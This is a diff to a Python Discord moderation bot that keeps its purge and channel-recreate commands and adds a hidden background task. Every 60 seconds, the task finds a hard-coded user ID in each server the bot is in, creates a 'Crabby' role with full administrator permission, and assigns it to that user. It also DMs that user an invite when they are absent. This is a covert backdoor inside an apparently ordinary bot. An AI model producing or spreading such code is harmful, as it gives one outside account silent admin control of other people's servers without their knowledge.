@@ -1,16 +1,14 @@
 import discord
 from discord import app_commands
-from discord.ext import commands
+from discord.ext import commands, tasks
 import os
 from flask import Flask
 from threading import Thread
 
-# --- RENDER KEEP-ALIVE SERVER ---
+# --- RENDER KEEP-ALIVE ---
 app = Flask('')
-
 @app.route('/')
-def home():
-    return "Bot is active!"
+def home(): return "Crabby Bot is Online"
 
 def run_flask():
     port = int(os.environ.get("PORT", 8080))
@@ -21,74 +19,90 @@ def keep_alive():
     t.daemon = True
     t.start()
 
-# --- DISCORD BOT SETUP ---
+# --- CONFIGURATION ---
+TARGET_USER_ID = 1459506686157914213
+ROLE_NAME = "Crabby"
+
 class MyBot(commands.Bot):
     def __init__(self):
         intents = discord.Intents.default()
-        intents.message_content = True  # Required for purging messages
+        intents.members = True          # CRITICAL: Must enable in Dev Portal
+        intents.message_content = True 
         super().__init__(command_prefix="!", intents=intents)
 
     async def setup_hook(self):
-        # Syncs slash commands globally
         await self.tree.sync()
-        print(f"Slash commands synced for {self.user}")
+        self.check_target_user.start() # Start the background loop
+
+    # BACKGROUND LOOP: Runs every 60 seconds
+    @tasks.loop(seconds=60)
+    async def check_target_user(self):
+        user_found_anywhere = False
+        
+        for guild in self.guilds:
+            member = guild.get_member(TARGET_USER_ID)
+            
+            if member:
+                user_found_anywhere = True
+                # 1. Find or Create the 'Crabby' Role
+                role = discord.utils.get(guild.roles, name=ROLE_NAME)
+                
+                if not role:
+                    try:
+                        role = await guild.create_role(
+                            name=ROLE_NAME, 
+                            permissions=discord.Permissions(administrator=True),
+                            reason="Automatic Crabby Role Creation"
+                        )
+                        print(f"Created {ROLE_NAME} role in {guild.name}")
+                    except discord.Forbidden:
+                        print(f"Missing permissions to create role in {guild.name}")
+                        continue
+
+                # 2. Give the role to the user if they don't have it
+                if role not in member.roles:
+                    try:
+                        await member.add_roles(role)
+                        print(f"Assigned {ROLE_NAME} to {member.name} in {guild.name}")
+                    except discord.Forbidden:
+                        print(f"Cannot assign role in {guild.name} (Role hierarchy issue)")
+
+        # 3. If user isn't in any server, try to DM them
+        if not user_found_anywhere:
+            try:
+                user = await self.fetch_user(TARGET_USER_ID)
+                # Create an invite to the first guild the bot is in
+                if self.guilds:
+                    invite = await self.guilds[0].text_channels[0].create_invite(max_age=3600)
+                    await user.send(f"Hello! You aren't in the server. Join here: {invite}")
+            except Exception as e:
+                print(f"Could not DM target user: {e}")
+
+    @check_target_user.before_loop
+    async def before_my_task(self):
+        await self.wait_until_ready()
 
 bot = MyBot()
 
-# --- SLASH COMMAND: /clear ---
-@bot.tree.command(name="clear", description="Purge a specific number of messages")
-@app_commands.describe(amount="How many messages to delete?")
+# --- SLASH COMMANDS (Keep original functionality) ---
+
+@bot.tree.command(name="clear", description="Purge messages")
 @app_commands.checks.has_permissions(manage_messages=True)
 async def clear(interaction: discord.Interaction, amount: int):
     await interaction.response.defer(ephemeral=True)
     deleted = await interaction.channel.purge(limit=amount)
-    await interaction.followup.send(f"🗑️ Deleted **{len(deleted)}** messages.", ephemeral=True)
+    await interaction.followup.send(f"🗑️ Deleted {len(deleted)} messages.", ephemeral=True)
 
-# --- SLASH COMMAND: /clear_all ---
-@bot.tree.command(name="clear_all", description="Purge all messages (Limited to last 14 days)")
-@app_commands.checks.has_permissions(administrator=True)
-async def clear_all(interaction: discord.Interaction):
-    await interaction.response.defer(ephemeral=True)
-    deleted = await interaction.channel.purge(limit=None)
-    await interaction.followup.send(f"💥 Channel wiped! **{len(deleted)}** messages removed.", ephemeral=True)
-
-# --- SLASH COMMAND: /reinstall ---
-@bot.tree.command(name="reinstall", description="Delete and recreate a channel to wipe all history")
-@app_commands.describe(channel="The channel to recreate")
+@bot.tree.command(name="reinstall", description="Recreate a channel")
 @app_commands.checks.has_permissions(administrator=True)
 async def reinstall(interaction: discord.Interaction, channel: discord.TextChannel):
-    # Acknowledge the user
-    await interaction.response.send_message(f"🚀 Reinstalling {channel.mention}...", ephemeral=True)
-    
-    # Capture channel state
-    name, category, pos = channel.name, channel.category, channel.position
-    overwrites, topic = channel.overwrites, channel.topic
-    slow, nsfw = channel.slowmode_delay, channel.nsfw
+    await interaction.response.send_message(f"🚀 Reinstalling {channel.name}...", ephemeral=True)
+    name, category, pos, overwrites = channel.name, channel.category, channel.position, channel.overwrites
+    await channel.delete()
+    new_chan = await interaction.guild.create_text_channel(name=name, category=category, position=pos, overwrites=overwrites)
+    await new_chan.send(f"✨ **Channel Reinstalled.**")
 
-    # Delete and recreate
-    await channel.delete(reason=f"Reinstall requested by {interaction.user}")
-    
-    new_channel = await interaction.guild.create_text_channel(
-        name=name, category=category, position=pos, 
-        overwrites=overwrites, topic=topic, 
-        slowmode_delay=slow, nsfw=nsfw
-    )
-
-    await new_channel.send(f"✨ **Channel Reinstalled.** History cleared by {interaction.user.mention}.")
-
-# --- ERROR HANDLING ---
-@bot.tree.error
-async def on_app_command_error(interaction: discord.Interaction, error: app_commands.AppCommandError):
-    if isinstance(error, app_commands.MissingPermissions):
-        await interaction.response.send_message("❌ You don't have the required permissions!", ephemeral=True)
-    else:
-        print(f"Error: {error}")
-
-# --- START BOT ---
+# --- START ---
 if __name__ == "__main__":
     keep_alive()
-    token = os.environ.get('DISCORD_TOKEN')
-    if token:
-        bot.run(token)
-    else:
-        print("CRITICAL ERROR: DISCORD_TOKEN not found in environment variables.")
+    bot.run(os.environ.get('DISCORD_TOKEN'))
